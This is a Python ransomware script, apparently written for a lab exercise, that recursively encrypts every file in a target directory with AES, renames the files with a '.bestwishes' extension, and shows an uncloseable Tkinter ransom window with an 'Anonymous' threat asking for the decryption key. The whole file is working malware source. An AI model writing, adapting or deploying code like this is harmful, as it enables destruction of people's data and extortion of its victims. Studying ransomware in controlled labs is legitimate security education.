#!/usr/bin/env python3
import os,time
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import binascii
from re import L
from tkinter import *
from tkinter import font
from turtle import color
from PIL import ImageTk,Image
from Crypto import Random
import threading

key = get_random_bytes(32)
print("start")
with open('key.txt', 'w') as f:
    f.write(str(key))

iv = Random.new().read(AES.block_size)



global target
target="/home/maito/Desktop/os-lab/test";
'''target=os.getcwd()  #change accordingly'''
    
def encrypt_file(efile):
    newfile = str(efile)+".bestwishes"
    with open(efile, "rb") as f:
        data = f.read()
        cipher = AES.new(key, AES.MODE_CBC,iv) # Create a AES cipher object with the key using the mode CBC
        ciphered_data = cipher.encrypt(pad(data, AES.block_size)) # Pad the input data and then encrypt
    with open (efile, "wb") as f:
        f.write(iv)
        f.write(ciphered_data)
    os.rename(efile,newfile)

def encrypt_files():
    threads = []
    for i in os.walk(target):
        for j in i[2]:
            if(j==os.path.basename(__file__)):
                continue
            
            if os.name == 'nt':
                efile = i[0] + "\\" + str(j)
            else:
                efile = i[0] + "/" + str(j)
            t = threading.Thread(target=encrypt_file, args=(efile,))
            threads.append(t)
            t.start()

    for t in threads:
        t.join()

def decryp():
    
    if(e.get()==str(key)):
        threads = []
        for i in os.walk(target):
            for j in i[2]:
                if(j==os.path.basename(__file__)):
                    continue
                    
                if os.name == 'nt':
                    efile = i[0] + "\\" + str(j)
                else:
                    efile = i[0] + "/" + str(j)
                t = threading.Thread(target=decrypt_file, args=(efile,))
                threads.append(t)
                t.start()

        for t in threads:
            t.join()

        time.sleep(1.5)
        root.quit()
    else:
    	print("wrong key")
    	wrong_key_label = Tk.Label(root, text="Wrong key")
    	wrong_key_label.pack()
        
def decrypt_file(efile):
    newfile = str(efile)[:-11]
    with open(efile, "rb") as f:
        iv=f.read(16)
        data = f.read()
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)  # Setup cipher
    original_data = unpad(cipher.decrypt(data), AES.block_size) # Decrypt and then up-pad the result

    with open (efile, "wb") as f:
        f.write(original_data)
    os.rename(efile,newfile)

#gui start
start_time = time.time()
encrypt_files()
end_time = time.time()
time_taken = end_time - start_time
print("time taken to finish encrypting file :")
print(time_taken)
root =Tk()
root.title("Warning Ransomware Attack")
root.geometry("500x600")
root.resizable(0,0)
def disable_event():
   pass

root.protocol("WM_DELETE_WINDOW", disable_event)

myimg=ImageTk.PhotoImage(Image.open(r"/home/maito/Desktop/imgransome.jpeg"))
labimg=Label(image=myimg)
labimg.pack()

Label(root,text="Enter Decryption Key",font=("Arial", 25)).pack()
e=Entry(root,width=100,borderwidth=5,font=("Arial", 15))
e.pack()
button1=Button(root,text="submit",font=("Arial", 15),command=decryp).pack()


l1=Label(root,text="\nATTENTION",font=("Arial", 25))
l1.pack()

l2=Label(root,text='''
WE ARE ANONYMOUS
WE ARE LEGION
WE DO NOT FORGIVE 
WE DO NOT FORGET.
''',font=("Arial", 25),fg="Red")
l2.pack()

root.mainloop()

